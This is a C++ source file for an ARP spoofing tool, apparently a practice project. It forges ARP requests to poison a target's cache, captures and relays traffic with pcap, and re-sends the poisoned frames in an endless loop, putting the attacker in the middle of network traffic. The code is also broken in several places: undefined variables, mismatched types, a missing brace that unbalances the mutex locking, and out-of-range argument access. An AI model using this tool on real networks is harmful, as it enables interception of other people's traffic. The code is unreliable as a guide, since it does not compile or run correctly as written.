#include "arpspoof.h"

// ARP(Operation opcode, Ipv4Addr target_ip, Ipv4Addr sender_ip, HWAddr target_hw, HWAddr sender_hw);
Ethernet ArpSpoofer::make_infection(session sess) {
    auto ether = Ethernet(*sess.sender_mac, iface.mac(), Ethernet::EtherType::ARP);
    ether/=ARP(ARP::Operation::REQ, *sess.target_ip, *sess.sender_ip, iface.mac(), *sess.sender_mac);
    return ether;
}

void ArpSpoofer::push_relay_packet()
{
    pcap_t* desc = capturer_.retrun_capturer();
    int res = 0;
    while((res = pcap_next_ex(desc, &capturer_.pkthdr,&capturer_.packet))) {
        if(res == 0) continue;           
        Ethernet my_eth = Ethernet();
        IP my_ip = IP();
        my_eth /= my_ip;    
        bytes b = bytes(pkt, pkt+sizeof(Ethernet)+sizeof(IP));
        my_eth.deserialize(b);
                                        
        for(auto s : sessions) {
            switch (htons((int16_t)my_eth.type()))
            {
            case (uint16_t)Ethernet::EtherType::ARP :{
                if ( my_eth.dst_mac().mac() == s.target_mac->mac() ) 
                    mtx.lock();
                    relay_qeue.push( make_infection(s).serialize() );                
                    mtx.unlock();
                break;
            }
            case (uint16_t)Ethernet::EtherType::IP :{
                if ( my_ip.dest_ip().ip() == s.target_ip->ip() )  {                    
                    mtx.lock();
                    relay_qeue.push( 
                        Ethernet(iface.mac(), *s.target_mac,Ethernet::EtherType::IP).serialize()
                    );
                    mtx.unlock();       
                }
                break;
            }
            default:
                break;
            }
        }        
    }
}

void ArpSpoofer::run()
{
    vector<session> ifv;
    for (auto sess : sessions)
        ifv.push_back(make_infection(sess));

    std::thread t1{ &ArpSpoofer::push_relay_packet, this };
    t1.join();

    while (not relay_qeue.empty()) {
        arp_sender.send_packet(relay_qeue.front());

        mtx.lock();
        relay_qeue.pop();
        mtx.unlock();
    }

    while (true) {
        for (auto vir : ifv)
            arp_sender.send_packet(e.serialize());
        usleep(300);
    }
}

int main(int argc, char* argv[]) {
    for(int i = 2; i < argc; i++) {
        auto ss = session(string(argv[i]),string(argv[i+1]));
    }
    
    auto ar = ArpSpoofer(string(argv[1]), ss);    
}